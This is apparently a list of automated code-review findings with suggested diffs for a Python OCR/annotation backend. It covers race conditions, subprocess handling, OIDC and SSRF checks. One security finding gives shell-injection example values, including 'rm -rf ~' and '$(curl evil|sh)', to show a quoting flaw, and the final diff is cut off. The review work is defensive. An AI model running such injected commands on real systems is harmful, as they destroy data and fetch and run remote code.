### `backend/app/services/images.py:67-68`

*bug · high*

`exif_datetime` never returns what its docstring promises. `DateTimeOriginal` (0x9003) lives in the Exif sub-IFD (tag 0x8769), not in the IFD0 that `im.getexif().get()` exposes, so for ordinary camera JPEGs the preferred tag is silently never used and `scan_date` ends up empty. And when a value is found it is sliced with `str(raw).strip()[:10]`: EXIF stores `'YYYY:MM:DD HH:MM:SS'`, so the result is `'2023:05:14'` (colons), not the documented `YYYY-MM-DD`, and it is written verbatim to `meta_json.scan_date` (scan.py:197); a `bytes` payload yields `b'2023:05:1'`-style garbage. Read the Exif sub-IFD explicitly, keep the IFD0 `DateTime` fallback, and normalize the value instead of blindly slicing it.

```diff
-            if raw:
-                return str(raw).strip()[:10]
+            if raw:
+                text = str(raw).strip()
+                # EXIF: "YYYY:MM:DD HH:MM:SS" -> contratto YYYY-MM-DD
+                date = text.split()[0].replace(":", "-") if text else ""
+                if len(date) == 10 and date[4] == "-" and date[7] == "-" and date[:4].isdigit():
+                    return date
+                return None
```

### `backend/app/services/labeling.py:175-179`

*bug · high*

Collision detection in `services/labeling.py` only compares raw strings, while `services/model_labels.py` keys labels by `normalize_label(name)` (lowercase, `[\s_-]+` collapsed) and `resolve_native_label` returns the **first** match walking `schema_labels`, defaults first. A custom name such as `text`, `Text_` or `issue_date`, or an alias such as `grid` (`Table`), `date` (`Issue-date`) or `text` (`Text`), therefore silently collides with a builtin class: in `canonical` the custom name overwrites the default entry, and the researcher's alias is dead on arrival, so blocks are labelled with the wrong class. Collect the normalized keys of all default names/aliases plus the custom names/aliases seen so far and reject colliding names and aliases.

```diff
-        if name in _DEFAULT_NAMES:
-            raise LabelValidationError("label_name_conflict", name=name)
-        if name in seen:
-            raise LabelValidationError("label_name_duplicate", name=name)
-        seen.add(name)
+        key = _name_key(name)  # e.g. re.sub(r"[\s_-]+", " ", name.lower()).strip()
+        if key in _DEFAULT_NAME_KEYS:
+            raise LabelValidationError("label_name_conflict", name=name)
+        if key in seen:
+            raise LabelValidationError("label_name_duplicate", name=name)
+        seen.add(key)
```

### `backend/app/services/live.py:0`

*bug · high*

`broadcast` keeps a reference to `room` across `await` points. If, during one of those awaits, an `unregister` empties the room and removes it from `self._rooms`, then a new `register` for the same `page_id` creates a *fresh* dict. The `if not room: self._rooms.pop(page_id, None)` below then operates on the stale (now empty) dict and deletes the *new* room entry, silently orphaning the just-registered connection (it will never receive presence/broadcast messages and never be cleaned up). Re-check identity before popping, e.g. only remove when the mapping still points at the same dict.

Suggested code:

```
        for conn_id in dead:
            room.pop(conn_id, None)
        if not room and self._rooms.get(page_id) is room:
            self._rooms.pop(page_id, None)
```

### `backend/app/services/local_runtime.py:29-30`

*maintainability · high*

The install list contradicts its own comment: the MinerU note states the published compatibility matrix requires vLLM < 0.22.0, but `"vllm"` is unpinned, so a fresh runtime resolves to whatever is latest (possibly >= 0.22.0) and `mineru_vl_utils:MinerULogitsProcessor` may no longer work — and because `ensure_ready()` never reinstalls, the wrong version is frozen for every adapter sharing this venv. `mineru-vl-utils` is unpinned too, while the rest of the codebase pins it to `==2.0.5` (`models/mineru2_5.py`, `mineru_mlx_runtime.PACKAGES`); an unconstrained resolution can pull a different API.

```diff
-PACKAGES = [
-    "vllm",
+PACKAGES = [
+    # Pin espliciti: una risoluzione non vincolata può superare 0.22.0 e
+    # rompere `mineru_vl_utils:MinerULogitsProcessor`.
+    "vllm<0.22.0",
```

### `backend/app/services/local_runtime.py:59-60`

*bug · high*

`is_ready()` only checks that the `vllm` console script exists, but `pip install vllm mineru-vl-utils timm gradio pypdfium2` creates entry points package by package: if vLLM installs and a later package fails, `state='failed'` is written yet `_vllm_bin()` now exists, so `is_ready()` returns True, every later `ensure_ready()` short-circuits on its first line and `install_state()` reports `ready: True`, masking the stored failure — the runtime stays permanently half-installed (MinerU/GLM fail at import) and the only way out is deleting the directory by hand. Conversely nothing re-verifies after a successful `pip install`, so `'ready'` can be recorded while `is_ready()` is still False, producing `{'ready': False, 'state': 'ready'}`. Tie readiness to a marker written only after the whole install succeeds: have `is_ready()` return True only when the `vllm` entry point exists *and* the state file parses with `state == 'ready'` (not `installing`), so a failed install is retried instead of being reported as ready forever.

```diff
-def is_ready() -> bool:
-    return _vllm_bin().exists()
+def is_ready() -> bool:
+    if not _vllm_bin().exists():
+        return False
+    try:
+        state = json.loads(_state_file().read_text(encoding="utf-8"))
+    except (OSError, ValueError):
+        return False
+    # `failed`/`installing` significa installazione interrotta a metà: il
+    # solo eseguibile vllm non basta, `ensure_ready()` deve poter riprovare.
+    return state.get("state") in {"ready", "installing"}
```

### `backend/app/services/mineru_mlx_runtime.py:122`

*bug · high*

Destructive rebuild on a transient probe failure: `is_ready()` uses a 15 s `subprocess.run(..., timeout=15)`, and `subprocess.TimeoutExpired` (caught as `SubprocessError`) is reported as "not ready". On a slow/loaded machine the probe can time out while the venv is perfectly fine, and `ensure_ready()` then answers with `venv.EnvBuilder(clear=True)`, which deletes the existing runtime directory (and its `.install.log`/`.install_state.json`) and forces a full multi-hundred-MB reinstall. Distinguish "probe failed/timed out" from "venv absent", e.g. retry the probe once or only clear after confirming the interpreter really is broken/half-installed.

Current code:

```
        venv.EnvBuilder(with_pip=True, clear=True).create(str(target))
```

### `backend/app/services/mlx_runtime.py:51-57`

*bug · high*

`subprocess.run` here has no `timeout` and no `OSError`/`SubprocessError` handling. Two consequences: (1) if the interpreter exists but is not executable (broken symlink, no +x, quarantined binary) `subprocess.run` raises `PermissionError`/`OSError`, which propagates out of `is_ready()` and therefore out of `install_state()`, `ensure_ready()` and `serve_manager.start()` — the user sees a crash instead of "runtime not ready"; (2) importing `mlx_vlm.server` pulls in `mlx`/`transformers` and can take seconds or hang, blocking the caller (a start worker thread) indefinitely. The sibling `mineru_mlx_runtime.is_ready()` already wraps the probe in `try/except (OSError, subprocess.SubprocessError)` with `timeout=15`; do the same here and treat any failure as "not ready".

```diff
-    probe = subprocess.run(
-        [str(python_bin()), "-c", "import mlx_vlm.server"],
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    return probe.returncode == 0
+    try:
+        probe = subprocess.run(
+            [str(python_bin()), "-c", "import mlx_vlm.server"],
+            capture_output=True,
+            text=True,
+            check=False,
+            timeout=15,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return False
+    return probe.returncode == 0
```

### `backend/app/services/modal_manager.py:221-223`

*bug · high*

`process_group` is deliberately dropped from the recovered payload, so `_cancel_deploy_if_running()` always falls back to `persisted.get("process_group") or pid` and calls `os.killpg(pid, 15)`. Since the deploy process is not a group leader, that raises `ESRCH` (swallowed by the bare `except OSError: pass`), leaving the orphaned deploy alive right before `modal app stop`. Return the stored value here (once the child is spawned in its own session, see `_start`).

```diff
-        "template_id": command.get("template_id"),
-        "log_path": row["log_path"],
-    }
+        "template_id": command.get("template_id"),
+        "log_path": row["log_path"],
+        "process_group": int(row["process_group"] or pid),
+    }
```

### `backend/app/services/modal_manager.py:256-257`

*bug · high*

Only `sqlite3.OperationalError` is handled here. If `os.getpgid(proc.pid)` raises `OSError`/`ProcessLookupError`, or `jobstore.start_modal_job` raises anything else (e.g. `sqlite3.ProgrammingError`, `TypeError`), the exception propagates while the just-spawned `modal deploy` keeps running untracked and `_task` is never set — so `_persisted_running()` sees no row and a second deploy can be started on top of a live one. Wrap the bookkeeping in `except BaseException`/`except Exception`, terminate (and reap) the child, and only then re-raise.

Current code:

```
        try:
            job_id = jobstore.start_modal_job(
```

### `backend/app/services/modal_manager.py:260`

*bug · high*

`Popen` is launched without `start_new_session=True`, so the child stays in the backend's own process group and this stores the *backend's* pgid in the job row. Every later `os.killpg(process_group, ...)` on that value would signal Tabularium itself (including its server), and the `recovery_strategy='pid-process-group'` contract cannot be honoured. Start the subprocess in its own session/group and record the child's real group (`proc.pid` with `start_new_session=True`).

Current code:

```
            process_group=os.getpgid(proc.pid) if hasattr(os, "getpgid") else proc.pid,
```

### `backend/app/services/model_registry.py:583-584`

*bug · high*

`_ACTIVE` is mutated from this monitor thread and from request threads (`start_download`, `cancel_download`) without any lock, and the code acts on a snapshot taken before `wait()`. Two consequences: (1) after `cancel_download()` pops the entry and persists `state="cancelled"`, this thread still owns `handle` and overwrites the state with `failed` ("codice di uscita -15"), so the UI ends up reporting a spurious failure after a user-initiated cancel; (2) if a new download was started for the same adapter in the meantime, the unconditional `_ACTIVE.pop()` at the end of `_monitor` removes the *new* process handle, making the running download invisible to `install_state`/`cancel_download`. Only write the terminal state and pop when `_ACTIVE.get(adapter_id) is handle`.

```diff
-    code = handle["proc"].wait()
-    ok = code == 0 and is_installed(adapter_id)
+    code = handle["proc"].wait()
+    if _ACTIVE.get(adapter_id) is not handle:
+        # la voce è stata sostituita o rimossa da un cancel/nuovo download
+        return
+    ok = code == 0 and is_installed(adapter_id)
```

### `backend/app/services/model_settings.py:270`

*bug · high*

_MLX_LIMITS is shared by several integer knobs, but `kv_bits` is the only one cast to `float`. `save_settings` persists the override, and `serve_manager`/`mlx_runtime.serve_argv` forward it to `mlx-vlm` as `str(value)` → the flag becomes `--kv-bits 4.0`, while `kv_group_size`, `max_kv_size` and `vision_cache_size` stay integers. Worse, the range check `2 <= value <= 8` lets fractional inputs (e.g. `4.5`) through unchanged, so a half bit width reaches the KV-cache quantizer. Cast `kv_bits` to `int` like its siblings (and reject fractional values, see the truncation comment below).

```diff
-            result[key] = float(value) if key == "kv_bits" else int(value)
+            result[key] = int(value)
```

### `backend/app/services/monkey_preprocess.py:46`

*bug · high*

`_last_error` is a single module-level slot written by every call. `dewarp.align_page` (used by `POST /api/pages/{id}/align`) calls `preprocess()` **without** the `_transform_lock` that `run_transform` holds, and FastAPI runs sync endpoints in a thread pool, so two concurrent pages can overwrite each other's error. The caller then reads `last_error()` and may report another page's failure (or `None`, falling back to the generic `monkeyocr_preprocessor_unavailable`). Each concurrent call also spawns its own Python process that reloads both nets, which is expensive on CPU-only. Return the error together with the result (e.g. a small result object/tuple) or keep it per-thread (`threading.local()`), and consider serialising the subprocess call like `run_transform` does.

Current code:

```
_last_error: str | None = None
```

### `backend/app/services/ocr.py:116`

*bug · high*

`_ensure` deliberately supports PaddleOCR 2.x (it accepts `use_angle_cls`/`show_log`), but `detect` only uses the 3.x API: PaddleOCR 2.x has no `predict()` method (only `ocr()`/`__call__`), and its result is a list of `[box, (text, score)]`, not dict-like pages. With a 2.x install the engine initializes fine and then blows up with `AttributeError` on the first page. Either detect drops 2.x support (and `_ensure` should not pretend to support it) or the parsing must branch on the PaddleOCR major version.

Current code:

```
        res = self._impl.predict(arr)
```

### `backend/app/services/oidc.py:106`

*security · high*

The scheme check accepts plaintext `http://` for the authorization endpoint and, more importantly, never validates `token_endpoint` (used in `exchange_code`) or `userinfo_endpoint`. A discovery document served over TLS can therefore point at `http://…` endpoints and the client secret, authorization code and access token/token response all travel in clear text — contradicting the module docstring's "read from `/userinfo` over TLS" premise. Require `https://` for all three endpoints (allowing `http://` only for an explicit localhost dev override) and check the token/userinfo URLs here, before they are cached.

Current code:

```
    if not str(document["authorization_endpoint"]).startswith(("https://", "http://")):
```

### `backend/app/services/oidc.py:119`

*bug · high*

Every new login wipes **all** in-flight state rows, not just the caller's. Two users starting a login at the same time (or one user with two tabs) delete each other's row and the second callback fails with `oidc_state`; the delete is also racy against a concurrent `put`, which can be removed right after being written. The single-use guarantee already comes from `store.pop()` in `consume_state`, so the blanket prefix delete is not needed for correctness. If the goal is to bound table growth, purge only rows whose `expires_at` is already in the past (e.g. `store.delete_expired_prefix(...)`) instead of dropping live states.

Current code:

```
    store.delete_prefix(_STATE_PREFIX)
```

### `backend/app/services/opencode_gateway.py:37-40`

*bug · high*

`TABULARIUM_OPENCODE_AUTH` is documented as an override, but the default archive is still appended and searched afterwards. If the custom archive is missing, empty or malformed (e.g. an isolated test fixture that has no `opencode-go` entry), the function silently falls back to the real user credentials in `~/.local/share/opencode/auth.json`. That breaks test isolation and hides configuration errors. When the env var is set it should be the only candidate considered.

```diff
-    custom = os.environ.get("TABULARIUM_OPENCODE_AUTH")
-    if custom:
-        paths.append(Path(custom))
-    paths.append(_AUTH_PATH)
+    custom = os.environ.get("TABULARIUM_OPENCODE_AUTH")
+    if custom:
+        paths = [Path(custom)]
+    else:
+        paths = [_AUTH_PATH]
```

### `backend/app/services/pages.py:585-587`

*bug · high*

Bulk approval does not enforce the gold-page rule that single-page `approve_page` enforces: pages protected by the study protocol are set to `approved` here even without a passing review, bypassing `_gold_pages` + `has_passing_review`. A gold page must not be approvable through the bulk path.

```diff
-            if readiness["ready"]:
-                pagestore.set_status(pid, "approved", conn)
-                approved += 1
+            if pid in gold and not pagestore.has_passing_review(pid, conn):
+                readiness.setdefault("errors", []).append(msg("gold_review", lang))
+                readiness["ready"] = False
+            if readiness["ready"]:
+                pagestore.set_status(pid, "approved", conn)
+                approved += 1
```

### `backend/app/services/pilot.py:16-23`

*bug · high*

Gold-page protection is all-or-nothing and silently disabled: the whole `protected` set is built in one comprehension inside a `try` that swallows `TypeError`/`ValueError` without logging. A single non-numeric entry in `gold_pages` (e.g. a typo in `settings_json`) yields an empty set, so the study-protocol gold pages end up in the pilot sample without any warning. In addition, if `study_protocol` is present but not a dict (`None`, list, string), `.get` raises `AttributeError`, which is not in the caught tuple and will propagate out of the sampler.

```diff
-    try:
-        settings = projectstore.settings_json(project_id)
-        protected = {
-            int(value)
-            for value in settings.get("study_protocol", {}).get("gold_pages", [])
-        }
-    except (TypeError, ValueError):
-        pass
+    settings = projectstore.settings_json(project_id)
+    protocol = settings.get("study_protocol")
+    if not isinstance(protocol, dict):
+        protocol = {}
+    gold_pages = protocol.get("gold_pages") or []
+    if not isinstance(gold_pages, list):
+        gold_pages = []
+    for value in gold_pages:
+        try:
+            protected.add(int(value))
+        except (TypeError, ValueError):
+            # un singolo valore malformato non deve disattivare la protezione degli altri
+            logger.warning("gold_pages: valore non numerico ignorato: %r", value)
```

### `backend/app/services/prefill.py:120-121`

*bug · high*

A failure in the table grid recognition is completely invisible to the caller. `_ocr_table_grid` swallows every exception and returns `None`; the caller then still inserts a `Table` block with an empty grid and yields it with `"error": None`, and `page_done` reports `tables: 1, grids: 0` without any indication of the failure. The user sees a table draft that silently lost its structure, and nothing in the payload lets the UI distinguish "no grid was needed" from "grid recognition crashed". Return the failure reason (or re-raise a typed error) so the block can carry an `error` like the model path does.

Current code:

```
    except Exception:  # noqa: BLE001
        return None
```

### `backend/app/services/prefill.py:298-302`

*bug · high*

`call_live` treats *any* `TypeError` whose message happens to mention one of these words as "the client does not support this kwarg". A genuine `TypeError` raised deep inside the model method (e.g. a formatting/`None` bug while a long vLLM request is running) is misread as a signature mismatch: the method is called again, duplicating an expensive (potentially minutes-long) inference. Worse, the fallback call drops `cancel_event`, so after this retry the request can no longer be cancelled by the SSE `cancel_event`, and the last fallback `method(*args)` also drops `hint`/`extra`, silently degrading the call. Prefer inspecting the signature (or declaring capability on the adapter) instead of sniffing exception messages, and always forward `cancel_event`.

Current code:

```
                    except TypeError as exc:
                        if not any(key in str(exc) for key in ("on_delta", "cancel_event", "on_retry", *extra)):
                            raise
                        try:
                            return method(*args, on_delta=callback, **extra)
```

### `backend/app/services/prefill.py:431-432`

*bug · high*

Destructive replace is committed before anything is written and there is no compensating path. If the user cancels (the check below, or the SSE disconnect handler) after this commit but before the first `insert_block`, the page keeps none of its original annotations and gets no replacement — silent total data loss for that page. Insert the first block (or collect the new blocks) before committing the DELETE, or restore the removed blocks when the loop aborts empty. The same pattern is repeated in `ocr_prelabel_events`.

Current code:

```
            replaced = conn.replace_blocks(pid, opts.mode)
            # Il DELETE di `_replaced_blocks` apre una transazione di
```

### `backend/app/services/prefill.py:640-643`

*bug · high*

`ocr_prelabel_events` handles per-page engine failures differently from `model_prelabel_events`: it raises `HTTPException` from inside the generator instead of yielding an `error` event. In the SSE route the exception is caught by the worker, turned into a single `error` frame and the stream is closed, so every remaining page_id is silently skipped; in the batch route (`ocr_prelabel_pages`) the exception propagates and discards the summaries of pages that were already written to the DB. Yield `{"type": "error", "page_id": pid, ...}` and `continue` like the model path. Note also that this generator has no `cancel_event`, so the Stop/disconnect cancellation handled by the SSE route cannot interrupt the local OCR at all.

```diff
-                raise HTTPException(
-                    status_code=400,
-                    detail=msg("ocr_engine_failed", lang, engine=engine.name, exc=exc),
-                ) from exc
+                yield {
+                    "type": "error",
+                    "page_id": pid,
+                    "message": str(msg("ocr_engine_failed", lang, engine=engine.name, exc=exc)),
+                }
+                continue
```

### `backend/app/services/process_probe.py:29-34`

*bug · high*

`text=True` decodes `ps` output with the locale encoding in strict mode. A process whose command line contains bytes that are not valid in that encoding (quite possible: argv is arbitrary bytes on POSIX) makes `subprocess.run` raise `UnicodeDecodeError`, which is a `ValueError` and therefore not covered by the `(OSError, subprocess.SubprocessError)` handler below. The exception then escapes `_ps_field` and breaks `process_state`/`is_zombie`/`process_cmdline` callers (e.g. `_pid_alive` polling loops) instead of degrading to `None` as the contract says. Decode explicitly with replacement characters.

```diff
-        done = subprocess.run(
-            ["ps", "-ww", "-o", f"{field}=", "-p", str(pid)],
-            capture_output=True,
-            text=True,
-            timeout=_PS_TIMEOUT,
-        )
+        done = subprocess.run(
+            ["ps", "-ww", "-o", f"{field}=", "-p", str(pid)],
+            capture_output=True,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+            timeout=_PS_TIMEOUT,
+        )
```

### `backend/app/services/rate_limit.py:21-24`

*bug · high*

The result of `store.bump()` is discarded, and the adapter's bump is `UPDATE ... WHERE key=?`, which silently affects 0 rows when the row was deleted between the read and the write (e.g. a concurrent successful login calls `reset()`, or the window row was replaced/removed by another caller). In that case `allow()` returns True without recording the attempt, letting the attempt go uncounted indefinitely. Either have the adapter return `cursor.rowcount` and treat 0 as "window gone, start a new one", or fold the increment into the same atomic statement as the check.

Current code:

```
    if current[1] >= limit:
        return False
    store.bump(key)
    return True
```

### `backend/app/services/remote_eval.py:74-76`

*bug · high*

`_serve_dir(cfg)` returns `None` when `ssh_train_repo` is unset, so the probe becomes `sys.path.insert(0, None)`, which raises `TypeError` and is reported as "Official model registration is incompatible with the runtime". The real misconfiguration (missing serving repo) is thus masked and only surfaces later in `remote_endpoint`. Validate the directory here (or raise the same `ValueError`) before building the probe.

```diff
-    updated = {**cfg, 'ssh_python': f'{runtime}/bin/python'}
-    probe = ('import sys; '
-             f'sys.path.insert(0, {_serve_dir(cfg)!r}); '
+    serve_dir = _serve_dir(cfg)
+    if not serve_dir:
+        raise ValueError('Remote serving repository is not configured')
+    updated = {**cfg, 'ssh_python': f'{runtime}/bin/python'}
+    probe = ('import sys; '
+             f'sys.path.insert(0, {serve_dir!r}); '
```

### `backend/app/services/remote_eval.py:98-99`

*bug · high*

The remote port and the `/tmp/tabularium-comparison` files (serve.log, compat/sitecustomize.py, serve-wrapper.py) are fixed for every evaluation. A concurrent comparison (or a retry after a crashed run left a server alive) collides on port 18921, and the `finally` block's `kill -- -{server_pid}` can then tear down another run's serving process. Derive the port and the temp directory from the run/checkpoint (e.g. `run_id` + a random suffix), or pick a free remote port and clean up only the PID this call started.

Current code:

```
    remote_port = 18921
    remote_log = '/tmp/tabularium-comparison/serve.log'
```

### `backend/app/services/scan.py:234-235`

*bug · high*

Only `pdf_page_count` is guarded by try/except. Everything after it — `iter_pdf_pages` (which raises on encrypted/corrupt PDFs or on a failing page render), `pil_img.save(...)`, `save_pdf_thumb(...)` — can raise and propagate out of `register_candidate`. Because `run_scan` runs inside a single `with connect() as conn:` unit, the exception rolls back the entire scan (all pages registered so far, all `missing` updates) and the HTTP endpoint returns 500 / the job is marked failed, instead of recording the offending file in `report.errors` like the image branch does. Wrap the PDF branch (or each page) in try/except, append to `report.errors`, and continue with the next candidate; also close `pil_img` in a `finally` so a failing save does not leak the PIL buffer.

```diff
-    for page_idx, rendered in enumerate(iter_pdf_pages(cand.path)):
-        pil_img, (width, height) = rendered
+    try:
+        pages = iter_pdf_pages(cand.path)
+        for page_idx, rendered in enumerate(pages):
+            pil_img, (width, height) = rendered
+            try:
+                ...
+            finally:
+                pil_img.close()
+    except Exception as exc:  # PDF corrotto/cifrato o pagina illeggibile
+        report.errors.append(f"{cand.path.name}: {exc}")
+        return
```

### `backend/app/services/serve_manager.py:190-192`

*bug · high*

After a backend restart the only evidence used here is that the PID exists. PIDs are recycled: the row may point at an unrelated process of the user, which is then reported as a running server with stale `adapter_id`/`port` metadata (and `stop()` relies on this same record). Apply the same command-line attribution guard used in `stop()` (`_is_our_serving_process`) before declaring the persisted server alive.

```diff
-        if pid <= 0:
-            raise OSError("PID server assente")
-        os.kill(pid, 0)
+        if pid <= 0:
+            raise OSError("PID server assente")
+        os.kill(pid, 0)
+        if not _is_our_serving_process(pid):
+            # PID riciclato: non è il nostro server, non va annunciato come tale.
+            raise OSError("PID appartenente a un altro processo")
```

### `backend/app/services/serve_manager.py:791`

*bug · high*

`start()` is normally invoked from the daemon thread created in `start_async()`, and Python documents `preexec_fn` as unsafe in a multi-threaded process: after the fork the child can deadlock on an inherited lock before `exec`. `start_new_session=True` gives the same `setsid()` semantics without running Python in the child.

```diff
-            preexec_fn=os.setsid if hasattr(os, "setsid") else None,
+            start_new_session=hasattr(os, "setsid"),
```

### `backend/app/services/serve_manager.py:943-944`

*bug · high*

`_terminate()` returns `False` when the process survives both SIGTERM and SIGKILL, but the result is discarded: the job is marked `stopped` and `_ACTIVE_PROC`/`_ACTIVE_INFO` are cleared anyway. A still-live vLLM keeps the GPU and the port, yet this module forgets it — and the next `start()` will find the port busy with a PID it can no longer attribute. Only clear the bookkeeping (and mark the job stopped) when the process is really gone; otherwise keep the handle and surface the failure.

```diff
-    if pid:
-        _terminate(pid, process_group, process=managed_proc)
+    if pid:
+        terminated = _terminate(pid, process_group, process=managed_proc)
+        if not terminated:
+            # The process is still alive: keep tracking it so the next start()
+            # can retry instead of losing the only handle on the GPU/port.
+            raise RuntimeError(
+                f"impossibile terminare il server locale (PID {pid}): risulta ancora attivo"
+            )
```

### `backend/app/services/settings.py:86`

*bug · high*

`str(None)` produces the literal `"None"`, so an explicit `null` for `oidc_client_id` is persisted as the bogus client id `"None"`; combined with the `oidc_enabled` check below (which only requires truthiness) OIDC can even be enabled with a meaningless client id. Same problem one line below for `oidc_button_label` (`null` renders as the label `"None"` instead of falling back to `SSO`). Coerce `None` to `""` before stripping.

```diff
-    settings["oidc_client_id"] = str(settings["oidc_client_id"]).strip()[:200]
+    settings["oidc_client_id"] = str(settings["oidc_client_id"] or "").strip()[:200]
```

### `backend/app/services/table_detect.py:715`

*bug · high*

`_row_gaps` measures gaps on `_shear_row_profile`, i.e. on the profile already **translated by `((band_mid - y_mid) * shear)`** (see `_shear_row_profile`). The returned `centre`s are therefore in the de-skewed frame, but `snap_boundaries` hands them back as pixel columns of the *unrotated* crop and `fill_cells` crops the original image with them (`ink[y0:y1, x]`, `image.crop(...)`). On a skewed page the offset is not negligible: at 1.43° (`shear ≈ 0.025`) over a 3500 px crop it is ~44 px — two characters — at the top/bottom rows. Net effect for skew: the bent boundary cancels exactly the compensation that was measured (in the de-skewed frame every row's gap sits at the same x, ≈ the prior), so `row_columns` and the `proven` flags claim a gap while the cut runs through the ink, and the snapped crops split values. Map the gaps back to the original frame before choosing.

```diff
-        gaps = _row_gaps(ink, band, pitch, shear, y_mid, suppress_leaders)
+        gaps = _row_gaps(ink, band, pitch, shear, y_mid, suppress_leaders)
+        # I varchi sono nel sistema raddrizzato: riportali sul ritaglio originale.
+        offset = int(round(((band[0] + band[1]) / 2.0 - y_mid) * shear))
+        gaps = [(centre - offset, gap_width) for centre, gap_width in gaps]
```

### `backend/app/services/trainer.py:696-698`

*bug · high*

Race with `stop_run`: when the user stops a run, `stop_run` writes `state = "stopped"` and pops `_ACTIVE`, but this monitor thread is still blocked in `proc.wait()` and then unconditionally overwrites `run.json` with `finished`/`failed` (and re-settles the job via `jobstore.settle`). The user-visible result of stopping a run can become `failed`. Re-read the meta before writing and bail out (or keep `stopped`) when the persisted state is already terminal, e.g. `if meta.get("state") in {"stopped"}: return` plus skipping the `jobstore.settle` call.

Current code:

```
    meta = _read_run_meta(run_dir) or {}
    meta["state"] = state
    meta["ended_at"] = _now()
```

### `backend/app/services/trainer_metrics.py:51`

*bug · high*

Each field is converted with `int(float(...))` without any guard. `nvidia-smi` emits `[N/A]`, `[Not Supported]` or `[Unknown Error]` for `utilization.gpu` / `temperature.gpu` on MIG instances or virtualized GPUs, so a single unparsable field raises `ValueError` that propagates out of `gpu_snapshot()` and breaks the whole telemetry endpoint. The remote counterpart in `training_executor.gpu_snapshot` already guards this per line; do the same here.

```diff
-                    "memory_total": int(float(parts[2])),
+                    try:
+                        gpus.append(
+                            {
+                                "index": parts[0],
+                                "name": parts[1],
+                                "memory_total": int(float(parts[2])),
+                                "memory_used": int(float(parts[3])),
+                                "utilization": int(float(parts[4])),
+                                "temp": int(float(parts[5])),
+                            }
+                        )
+                    except ValueError:
+                        continue
```

### `backend/app/services/trainer_metrics.py:130`

*bug · high*

All-or-nothing parsing: the list comprehension is wrapped in a single `try`, so one truncated/corrupted line (e.g. the process was killed mid-write to `metrics.jsonl`) raises `JSONDecodeError` and every valid metric is silently discarded, returning `[]` for the whole run. Parse line by line and skip only the bad lines. Note also that non-dict JSON payloads would raise `AttributeError` in the `item.get(...)` calls below, which is not caught here.

```diff
-        metrics = [json.loads(l) for l in f.read_text(encoding="utf-8").splitlines() if l.strip()]
+        metrics: list[dict] = []
+        for raw in f.read_text(encoding="utf-8").splitlines():
+            if not raw.strip():
+                continue
+            try:
+                item = json.loads(raw)
+            except ValueError:
+                continue
+            if isinstance(item, dict):
+                metrics.append(item)
```

### `backend/app/services/trainer_script.py:79`

*security · high*

`remote_shell_path` only wraps the value in double quotes and does not escape the characters that double quotes still interpret. A config value such as `$HOME/x"; rm -rf ~; echo "` or `$HOME/$(curl evil|sh)` (e.g. `ssh_train_repo`, `ssh_python`, `model_cache`, all coming from the request/UI) breaks out of the quoting and is executed when the generated script runs on the host. Quote everything except the literal `$HOME` prefix (or reject values containing `"`, `` ` ``, `$(`).

```diff
-        return f'"{text}"'
+        # `$HOME` stays outside the quotes, the rest is single-quoted literally.
+        return '"$HOME"/' + shlex.quote(text[len("$HOME/"):])
```

### `backend/app/services/trainer_script.py:511`

*security · high*

The heredoc delimiter is unquoted (`<<YAML`), so bash performs expansion on the whole YAML body. `model_name_or_path` comes straight from `cfg['model_path']`/`cfg['model']`, so a path containing `$(...)`, backticks or a backslash is executed/mangled before LLaMA-Factory ever reads the file. Only `$RUN_DIR` actually needs expansion and its value is already known here (`run_dir`). Use a quoted delimiter (`<<'YAML'`) and interpolate the absolute run directory from Python instead of relying on shell expansion. On top of that, the YAML scalars are emitted unquoted, so a path containing `:` or `#` produces invalid YAML; serialise them with `json.dumps(...)`.

Current code:

```
        + 'cat > "$RUN_DIR/train_llamafactory.yaml" <<YAML\n'
```

### `backend/app/services/training_executor.py:123-132`

*security · high*

`_remote_dir()` interpolates `recipe.run_id` without any validation, while `SshExecutor.remote_dir()` validates the very same value against traversal/whitespace/metacharacters. `_remote_dir()` feeds both quoted commands and the unquoted rsync `host:path` specs (`sync_argv`, `download_artifacts`), which rsync forwards to `ssh` and the remote shell re-parses, so a `run_id` containing `..`, spaces or `;`/`|`/`` ` `` escapes the run root or is interpreted by the remote shell. Delegate to `remote_dir()` so both entry points share one validation (and drop the duplicated root checks).

```diff
-    def _remote_dir(self, recipe: TrainingRecipe) -> str:
-        root = self.remote_root.rstrip("/")
-        if (
-            not root
-            or root == "/"
-            or not root.startswith("/")
-            or any(ch in root for ch in " \t\r\n;|&`$\\")
-        ):
-            raise ValueError("remote_root SSH non valido")
-        return f"{root}/{recipe.run_id}"
+    def _remote_dir(self, recipe: TrainingRecipe) -> str:
+        """Directory remota della run, con la stessa validazione di `remote_dir`."""
+        return self.remote_dir(recipe.run_id)
```

### `backend/app/services/unlimited_ocr_mlx_server.py:120`

*bug · high*

`chat_completions` is a sync `def`, so FastAPI/uvicorn dispatches it to a worker thread; two overlapping requests therefore enter `stream_generate` concurrently on the same `model`/`processor` and GPU, and both call the global `mx.clear_cache()` / `mx.reset_peak_memory()` (see `release_memory`) while the other generation is running. There is no synchronization anywhere in the file. MLX state is process-global, so concurrent generation and cache clearing can corrupt results or mis-report peak memory. Serialize generation with a module-level lock (held for the whole iteration, which also makes the cache cleanup meaningful).

```diff
-    def generate(prompt: str, images: list, kwargs: dict):
+    generation_lock = threading.Lock()
+
+    def generate(prompt: str, images: list, kwargs: dict):
```

### `backend/app/services/url_security.py:11`

*security · high*

`allow_local` defaults to `True` and none of the current callers (`system.py` inference settings/test, `compute_profiles.create_profile/activate`) passes it explicitly. Since the endpoint value is user-controlled in those flows, the default silently permits requests to loopback/`localhost` services (SSRF against internal admin ports). Make local targets an explicit opt-in at the call sites instead of the default.

Current code:

```
def validate_endpoint(value: str, *, allow_local: bool = True) -> str:
```

### `backend/app/services/url_security.py:12`

*bug · high*

`urlparse` itself can raise `ValueError` for malformed input (e.g. unbalanced IPv6 brackets such as `http://[::1`), which is not caught here and turns a bad user-supplied endpoint into a 500 instead of the intended 400.

```diff
-    parsed = urlparse((value or "").strip())
+    try:
+        parsed = urlparse((value or "").strip())
+    except ValueError as exc:
+        raise HTTPException(status_code=400, detail="endpoint non valido: URL malformato") from exc
```

### `backend/app/services/url_security.py:17`

*bug · high*

`parsed.port` raises `ValueError` when the port component is non-numeric or out of the 0-65535 range (e.g. `https://host:99999/`). Because it is evaluated inside `socket.getaddrinfo(...)` and only `OSError` is caught, such input produces a 500 instead of a 400. Extract and validate the port before resolving.

```diff
